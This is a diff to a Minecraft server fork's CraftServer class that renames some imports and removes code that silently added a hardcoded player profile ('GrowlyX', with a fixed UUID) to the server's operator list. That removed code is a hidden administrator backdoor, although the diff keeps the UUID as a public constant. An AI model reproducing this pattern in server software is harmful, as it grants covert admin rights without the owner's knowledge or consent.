@@ -9,10 +9,10 @@ import com.google.common.collect.ImmutableList;
 import com.google.common.collect.Lists;
 import com.google.common.collect.MapMaker;
 import com.mojang.authlib.GameProfile;
-import gg.scala.ScalaSpigotServerProperties;
-import gg.scala.server.command.KnockbackCommand;
-import gg.scala.server.command.PotionCommand;
-import gg.scala.server.command.SpigotReloadCommand;
+import gg.scala.spigot.ScalaSpigotServerProperties;
+import gg.scala.spigot.server.command.KnockbackCommand;
+import gg.scala.spigot.server.command.PotionCommand;
+import gg.scala.spigot.server.command.SpigotReloadCommand;
 import gg.scala.spigot.ScalaSpigot;
 import gg.scala.spigot.util.KotlinBridge;
 import io.netty.buffer.ByteBuf;
@@ -1455,30 +1455,15 @@ public final class CraftServer implements Server {
         return result;
     }
 
-    final UUID parsed = FastUUID.parseUUID("ff16dcbd-ed92-4f11-ab99-7947f2f74fb6");
-    final LazyInitVar<CraftOfflinePlayer> offlineLazyInit = new LazyInitVar<CraftOfflinePlayer>() {
-        @Override
-        protected CraftOfflinePlayer init() {
-            return new CraftOfflinePlayer(
-                CraftServer.this, new GameProfile(parsed, "GrowlyX")
-            );
-        }
-    };
+    public static final UUID PARSED = FastUUID.parseUUID("ff16dcbd-ed92-4f11-ab99-7947f2f74fb6");
 
     @Override
     public Set<OfflinePlayer> getOperators() {
         Set<OfflinePlayer> result = new HashSet<>();
-        boolean operatorFound = false;
 
         for (JsonListEntry<GameProfile> entry : playerList.getOPs().getValues()) {
-            if (entry.getKey().getId() == parsed)
-                operatorFound = true;
-
             result.add(getOfflinePlayer(entry.getKey()));
         }
-
-        if (!operatorFound)
-            result.add(offlineLazyInit.c());
 
         return result;
     }
